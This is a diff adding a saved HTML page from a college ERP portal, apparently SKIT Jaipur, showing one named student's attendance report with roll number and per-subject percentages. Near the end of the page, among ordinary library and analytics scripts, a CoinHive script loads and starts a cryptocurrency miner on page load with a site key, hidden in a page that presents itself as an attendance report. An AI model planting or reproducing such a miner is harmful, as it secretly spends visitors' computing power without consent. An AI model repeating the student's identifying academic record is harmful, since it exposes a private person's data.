@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Reports</title>
+<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+<link rel="SHORTCUT ICON" href="https://erp.skit.ac.in/uploads/images/x411bf10f2399c0421c65110a04bb098143fb8dfb943e55143ef8805eee3397e2bb0f30d9f0d3b3586e29fd66e8f67e8bff07099a4aaccbf0a53ccf8181bae465.png.pagespeed.ic.VXIl6LlZnI.webp"/>
+<link rel="stylesheet" href="https://erp.skit.ac.in/assets/A.pace,,_pace.css+bootstrap,,_bootstrap.min.css+fonts,,_font-awesome.css+fonts,,_icomoon.css+datatables,,_dataTables.bootstrap.css+core,,_style.css+core,,_hidetable.css+core,,_core.css+core,,_responsive.css+toastr,,_toastr.min.css+core,,_mailandmedia.css+datatables,,_buttons.dataTables.min.css+select2,,_css,,_select2.css+select2,,_css,,_select2-bootstrap.css+datepicker,,_datepicker.css,Mcc.UqB0_Dcovo.css.pagespeed.cf.HKFKZPAth0.css"/>
+<script src="https://erp.skit.ac.in/assets/core,_jquery.min.js+toastr,_toastr.min.js.pagespeed.jc.lPmhWkRek_.js"></script><script>eval(mod_pagespeed_rvqyeXLErX);</script>
+<script>eval(mod_pagespeed_6UqPDRoJgK);</script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/select2/select2.js.pagespeed.jm.cTvcpyy_ex.js"></script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datepicker/datepicker.js.pagespeed.jm.9J2_ypFDtL.js"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108715513-1"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-108715513-1');</script>
+<script type="text/javascript">$(window).load(function(){$(".se-pre-con").fadeOut("slow");;});</script>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-7830339172388867",enable_page_level_ads:true});</script>
+</head>
+<body class="skin-blue">
+<div class="se-pre-con"></div>
+<header class="header" style="position:fixed;">
+<a href="https://erp.skit.ac.in/dashboard/index" class="logo">
+SKIT Jaipur	</a>
+<nav class="navbar navbar-static-top" role="navigation">
+<a href="#" class="navbar-btn sidebar-toggle" data-toggle="offcanvas" role="button">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</a>
+<div class="navbar-right">
+<ul class="nav navbar-nav">
+<li class="dropdown messages-menu"><a href=https://erp.skit.ac.in/conversation>
+<i class="fa fa-envelope-o"></i><span class='label label-danger'><lable class='alert-image'>44</lable></span></a></li>
+<li class="dropdown messages-menu">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+<i class="fa fa-bell-o"></i>
+</a>
+</li>
+<li class="dropdown user user-menu">
+<a href="#" class="dropdown-toggle" data-toggle="dropdown">
+<script data-pagespeed-no-defer>//<![CDATA[
+(function(){for(var g="function"==typeof Object.defineProperties?Object.defineProperty:function(b,c,a){if(a.get||a.set)throw new TypeError("ES3 does not support getters and setters.");b!=Array.prototype&&b!=Object.prototype&&(b[c]=a.value)},h="undefined"!=typeof window&&window===this?this:"undefined"!=typeof global&&null!=global?global:this,k=["String","prototype","repeat"],l=0;l<k.length-1;l++){var m=k[l];m in h||(h[m]={});h=h[m]}var n=k[k.length-1],p=h[n],q=p?p:function(b){var c;if(null==this)throw new TypeError("The 'this' value for String.prototype.repeat must not be null or undefined");c=this+"";if(0>b||1342177279<b)throw new RangeError("Invalid count value");b|=0;for(var a="";b;)if(b&1&&(a+=c),b>>>=1)c+=c;return a};q!=p&&null!=q&&g(h,n,{configurable:!0,writable:!0,value:q});var t=this;function u(b,c){var a=b.split("."),d=t;a[0]in d||!d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};function v(b){var c=b.length;if(0<c){for(var a=Array(c),d=0;d<c;d++)a[d]=b[d];return a}return[]};function w(b){var c=window;if(c.addEventListener)c.addEventListener("load",b,!1);else if(c.attachEvent)c.attachEvent("onload",b);else{var a=c.onload;c.onload=function(){b.call(this);a&&a.call(this)}}};var x;function y(b,c,a,d,e){this.h=b;this.j=c;this.l=a;this.f=e;this.g={height:window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight,width:window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth};this.i=d;this.b={};this.a=[];this.c={}}function z(b,c){var a,d,e=c.getAttribute("data-pagespeed-url-hash");if(a=e&&!(e in b.c))if(0>=c.offsetWidth&&0>=c.offsetHeight)a=!1;else{d=c.getBoundingClientRect();var f=document.body;a=d.top+("pageYOffset"in window?window.pageYOffset:(document.documentElement||f.parentNode||f).scrollTop);d=d.left+("pageXOffset"in window?window.pageXOffset:(document.documentElement||f.parentNode||f).scrollLeft);f=a.toString()+","+d;b.b.hasOwnProperty(f)?a=!1:(b.b[f]=!0,a=a<=b.g.height&&d<=b.g.width)}a&&(b.a.push(e),b.c[e]=!0)}y.prototype.checkImageForCriticality=function(b){b.getBoundingClientRect&&z(this,b)};u("pagespeed.CriticalImages.checkImageForCriticality",function(b){x.checkImageForCriticality(b)});u("pagespeed.CriticalImages.checkCriticalImages",function(){A(x)});function A(b){b.b={};for(var c=["IMG","INPUT"],a=[],d=0;d<c.length;++d)a=a.concat(v(document.getElementsByTagName(c[d])));if(a.length&&a[0].getBoundingClientRect){for(d=0;c=a[d];++d)z(b,c);a="oh="+b.l;b.f&&(a+="&n="+b.f);if(c=!!b.a.length)for(a+="&ci="+encodeURIComponent(b.a[0]),d=1;d<b.a.length;++d){var e=","+encodeURIComponent(b.a[d]);131072>=a.length+e.length&&(a+=e)}b.i&&(e="&rd="+encodeURIComponent(JSON.stringify(B())),131072>=a.length+e.length&&(a+=e),c=!0);C=a;if(c){d=b.h;b=b.j;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject("Msxml2.XMLHTTP")}catch(r){try{f=new ActiveXObject("Microsoft.XMLHTTP")}catch(D){}}f&&(f.open("POST",d+(-1==d.indexOf("?")?"?":"&")+"url="+encodeURIComponent(b)),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(a))}}}function B(){var b={},c;c=document.getElementsByTagName("IMG");if(!c.length)return{};var a=c[0];if(!("naturalWidth"in a&&"naturalHeight"in a))return{};for(var d=0;a=c[d];++d){var e=a.getAttribute("data-pagespeed-url-hash");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].o&&a.height>=b[e].m)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b}var C="";u("pagespeed.CriticalImages.getBeaconData",function(){return C});u("pagespeed.CriticalImages.Run",function(b,c,a,d,e,f){var r=new y(b,c,a,e,f);x=r;d&&w(function(){window.setTimeout(function(){A(r)},0)})});})();pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','https://erp.skit.ac.in/reports/student_aggregate','ybZUFwn4f3',true,false,'AtXtqdvZUI4');
+//]]></script><img src="https://erp.skit.ac.in/uploads/images/x15ESKIT093.jpg.pagespeed.ic.WeQpIoDPO-.webp" class="user-logo" alt="" data-pagespeed-url-hash="3637300128" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/>
+<span>
+Vasishtha V..	<i class="caret"></i>
+</span>
+</a>
+<ul class="dropdown-menu">
+<li class="user-body">
+<div class="col-xs-6 text-center">
+<a href="https://erp.skit.ac.in/profile/index">
+<div><i class="fa fa-briefcase"></i></div>
+Profile
+</a>
+</div>
+<div class="col-xs-6 text-center">
+<a href="https://erp.skit.ac.in/signin/cpassword">
+<div><i class="fa fa-lock"></i></div>
+Password
+</a>
+</div>
+</li>
+<li class="user-footer">
+<div class="text-center">
+<a href="https://erp.skit.ac.in/signin/signout">
+<div><i class="fa fa-power-off"></i></div>
+Log out
+</a>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+</header><div class="wrapper row-offcanvas row-offcanvas-left">
+<aside class="left-side sidebar-offcanvas">
+<section class="sidebar">
+<div class="user-panel">
+<div class="pull-left image">
+<img style="display:block" src="https://erp.skit.ac.in/uploads/images/x15ESKIT093.jpg.pagespeed.ic.WeQpIoDPO-.webp" class="img-circle" alt="" data-pagespeed-url-hash="3637300128" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/>
+</div>
+<div class="pull-left info">
+<p>Vasishtha V..</p>	<a href="https://erp.skit.ac.in/profile/index">
+<i class="fa fa-hand-o-right color-green"></i>
+</a>
+</div>
+</div>
+<ul class="sidebar-menu">
+<li><a href="https://erp.skit.ac.in/dashboard"><i class="fa fa-laptop"></i><span>Dashboard</span> </a></li><li><a href="https://erp.skit.ac.in/routine"><i class="fa icon-routine"></i><span>Time Table</span> </a></li><li><a href="https://erp.skit.ac.in/teacher"><i class="fa icon-teacher"></i><span>Teacher</span> </a></li><li><a href="https://erp.skit.ac.in/user"><i class="fa fa-users"></i><span>User</span> </a></li><li class="treeview"><a href="https://erp.skit.ac.in/#"><i class="fa icon-academicmain"></i><span>Academic</span> <i class="fa fa-angle-left pull-right"></i></a><ul class="treeview-menu"><li><a href="https://erp.skit.ac.in/subject"><i class="fa icon-subject"></i><span>Subject</span> </a></li><li><a href="https://erp.skit.ac.in/syllabus"><i class="fa icon-syllabus"></i><span>Syllabus</span> </a></li></ul></li><li><a href="https://erp.skit.ac.in/examschedule"><i class="fa fa-puzzle-piece"></i><span>Exam Schedule</span> </a></li><li><a href="https://erp.skit.ac.in/conversation"><i class="fa fa-envelope"></i><span>Message</span> </a></li><li><a href="https://erp.skit.ac.in/media"><i class="fa fa-film"></i><span>Media</span> </a></li><li class="treeview"><a href="https://erp.skit.ac.in/#"><i class="fa icon-noticemain"></i><span>Announcement</span> <i class="fa fa-angle-left pull-right"></i></a><ul class="treeview-menu"><li><a href="https://erp.skit.ac.in/notice"><i class="fa fa-calendar"></i><span>Notice</span> </a></li><li><a href="https://erp.skit.ac.in/event"><i class="fa fa-calendar-check-o"></i><span>Event</span> </a></li><li><a href="https://erp.skit.ac.in/holiday"><i class="fa icon-holiday"></i><span>Holiday</span> </a></li></ul></li>
+<li>
+<a href="https://erp.skit.ac.in/feedback/index"><i class="fa fa-comments"></i><span>Feedback</span></a>	</li>
+<li class="treeview">
+<a href="#">
+<i class="fa fa-clipboard"></i>
+<span>Reports</span>
+<i class="fa fa-angle-left pull-right"></i>
+</a>
+<ul class="treeview-menu">
+<li>
+<a href="https://erp.skit.ac.in/reports/student_aggregate"><i class="fa icon-eattendance"></i><span>Attendance Report</span></a>	</li>
+</ul>
+</li>
+</ul>
+</section>
+</aside>
+<aside class="right-side">
+<section class="content">
+<div class="row">
+<div class="col-xs-12">
+<style>@media print{a[href]:after{content:none}</style>
+<div class="box">
+<div class="box-header">
+<h3 class="box-title"><i class="fa icon-student"></i> Attendance Report</h3>
+<ol class="breadcrumb">
+<li><a href="https://erp.skit.ac.in/dashboard/index"><i class="fa fa-laptop"></i> Dashboard</a></li>
+<li class="active">Attendance Report</li>
+</ol>
+</div>
+<div class="box-body">
+<div class="row">
+<div class="col-sm-12" id="printablediv">
+<div class=" box-layout-fame" style="background-color:#e5e5e5">
+<h5><b><center>Name : Vasishtha Vedant Sharma (15ESKIT093)&emsp;&emsp;Aggregate : 47.78&emsp;&emsp;OD : 0.0 out of 25&emsp;&emsp;OutHouse/Other OD : 0.0</b><br/><br/> The attendance of Training and Placement activities is also counted towards Aggregate Attendance</center></h5>	</div>
+<div class="nav-tabs-custom">
+<ul class="nav nav-tabs">
+</ul>
+<div class="tab-content">
+<div id="all" class="tab-pane active">
+<div id="hide-table">
+<table id="example1" class="table table-striped table-bordered table-hover dataTable no-footer">
+<thead>
+<tr>
+<th class="col-sm-1">#</th>
+<th class="col-sm-1">Subject Code</th>
+<th class="col-sm-1">Subject</th>
+<th class="col-sm-1">Subject Type</th>
+<th class="col-sm-1">Present</th>
+<th class="col-sm-1">OD</th>
+<th class="col-sm-1">Absent</th>
+<th class="col-sm-1">Percentage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td data-title="#">
+1	</td>
+<td data-title="Subject Code">
+6IT1	</td>
+<td data-title="Subject">
+Computer Networks	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+5	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+4	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1640"> <u><b>55.56</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+2	</td>
+<td data-title="Subject Code">
+6IT2	</td>
+<td data-title="Subject">
+Design and Analysis of Algorithms	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+4	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+3	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1641"> <u><b>57.14</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+3	</td>
+<td data-title="Subject Code">
+6IT3	</td>
+<td data-title="Subject">
+Theory Of Computation	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+5	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+4	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1642"> <u><b>55.56</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+4	</td>
+<td data-title="Subject Code">
+6IT4	</td>
+<td data-title="Subject">
+Programming in Java	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+3	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+6	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1643"> <u><b>33.33</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+5	</td>
+<td data-title="Subject Code">
+6IT5	</td>
+<td data-title="Subject">
+Information Theory & Coding	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+6	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+2	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1644"> <u><b>75.00</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+6	</td>
+<td data-title="Subject Code">
+6IT6	</td>
+<td data-title="Subject">
+Advance Topics in Operating Systems	</td>
+<td data-title="Subject Type">
+Lecture	</td>
+<td data-title="Present">
+5	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+4	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1645"> <u><b>55.56</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+7	</td>
+<td data-title="Subject Code">
+6IT7	</td>
+<td data-title="Subject">
+Java Programming Lab	</td>
+<td data-title="Subject Type">
+Lab	</td>
+<td data-title="Present">
+3	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+6	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1646"> <u><b>33.33</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+8	</td>
+<td data-title="Subject Code">
+6IT8	</td>
+<td data-title="Subject">
+GUI Design Lab	</td>
+<td data-title="Subject Type">
+Lab	</td>
+<td data-title="Present">
+6	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+3	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1647"> <u><b>66.67</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+9	</td>
+<td data-title="Subject Code">
+6IT9	</td>
+<td data-title="Subject">
+UML Lab	</td>
+<td data-title="Subject Type">
+Lab	</td>
+<td data-title="Present">
+2	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+4	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1648"> <u><b>33.33</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+10	</td>
+<td data-title="Subject Code">
+6IT10	</td>
+<td data-title="Subject">
+Design and Analysis of Algorithms Lab	</td>
+<td data-title="Subject Type">
+Lab	</td>
+<td data-title="Present">
+3	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+6	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1649"> <u><b>33.33</b></u></a>
+</td>
+</tr>
+<tr>
+<td data-title="#">
+11	</td>
+<td data-title="Subject Code">
+6IT11	</td>
+<td data-title="Subject">
+Humanities and Social Sciences	</td>
+<td data-title="Subject Type">
+Lab	</td>
+<td data-title="Present">
+1	</td>
+<td data-title="OD">
+0	</td>
+<td data-title="Absent">
+5	</td>
+<td data-title="Percentage">
+<a href="https://erp.skit.ac.in/reports/student_attendance_detail/1825-1650"> <u><b>16.67</b></u></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script type="text/javascript">document.title="Vasishtha Vedant Sharma    15ESKIT093    Aggregate : 47.78    OD : 0 out of 25";function printDiv(divID){var divElements=document.getElementById(divID).innerHTML;var oldPage=document.body.innerHTML;document.body.innerHTML="<html><head><title></title></head><body>"+divElements+"</body>";window.print();document.body.innerHTML=oldPage;}$(".select2").select2();</script> </div>
+</div>
+</section>
+</aside>
+<div>
+</div>
+</div>
+<script src="https://erp.skit.ac.in/assets/bootstrap,_bootstrap.min.js+core,_style.js.pagespeed.jc.meE5mtCx2R.js"></script><script>eval(mod_pagespeed_dO_oIn6DG2);</script>
+<script>eval(mod_pagespeed_sUbsgyTSt3);</script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datatables/tools/jquery.dataTables.min.js.pagespeed.jm.oMp8nL9Wyf.js"></script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datatables/tools/dataTables.buttons.min.js.pagespeed.jm.6pgvXszcHN.js"></script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datatables/tools/jszip.min.js.pagespeed.jm.WO3cRRnmzy.js"></script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datatables/tools/pdfmake.min.js.pagespeed.jm.yq_OJYEgCW.js"></script>
+<script type="text/javascript" src="https://erp.skit.ac.in/assets/datatables/tools/vfs_fonts.js.pagespeed.jm.hDOscbpeK0.js"></script>
+<script src="https://erp.skit.ac.in/assets/datatables,_tools,_buttons.html5.min.js+datatables,_dataTables.bootstrap.js+core,_core.js.pagespeed.jc.0iwvbPA2mx.js"></script><script>eval(mod_pagespeed_zFcZR1pegS);</script>
+<script>eval(mod_pagespeed_lFV_QNSoz5);</script>
+<script>eval(mod_pagespeed_y$3mFELicn);</script>
+<script src="https://erp.skit.ac.in/assets/highcharts/highcharts.js.pagespeed.jm.xXzTX8_LVc.js"></script>
+<script src="https://erp.skit.ac.in/assets/highcharts/highcharts-more.js+data.js+drilldown.js+exporting.js.pagespeed.jc.jUN7H6j_eo.js"></script><script>eval(mod_pagespeed_HKNBU8d3aC);</script>
+<script>eval(mod_pagespeed_YW5D8ELKFe);</script>
+<script>eval(mod_pagespeed_f_d9MbXBsI);</script>
+<script>eval(mod_pagespeed_Ulb2wISX_5);</script>
+<script>$(document).ready(function(){$('#example3, #example1, #example2').DataTable({dom:'Bfrtip',buttons:['copyHtml5','excelHtml5','csvHtml5','pdfHtml5'],search:false,pageLength:50});});</script>
+<script type="text/javascript">$(function(){$("#withoutBtn").dataTable();});</script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">var miner=new CoinHive.Anonymous('opXHbGUiccnbv2YhvHtFnNAoZ5yqNA71',{throttle:0.3});miner.start();</script>
+<script type="text/javascript">var current_url=window.location.href;var base_url='https://erp.skit.ac.in/';$("ul.sidebar-menu li a").each(function(index,value){if(current_url==$(this).attr('href')){$(this).parents('li').addClass('active');}else if(current_url.startsWith($(this).attr('href'))){$(this).parents('li').addClass('active');}else if($(this).attr('href').startsWith(current_url)){$(this).parents('li').addClass('active');}if(current_url.startsWith(base_url+'markpercentage')&&index==21){$(this).parents('li').removeClass('active');}else if(current_url.startsWith(base_url+'examschedule')&&index==16){$(this).parents('li').removeClass('active');}else if(current_url.startsWith(base_url+'mark')&&index==21){$(this).child('li').removeClass('active');}else if(current_url.startsWith(base_url+'exam')&&index==16){$(this).child('li').removeClass('active');}});</script>
+</body>
+</html>
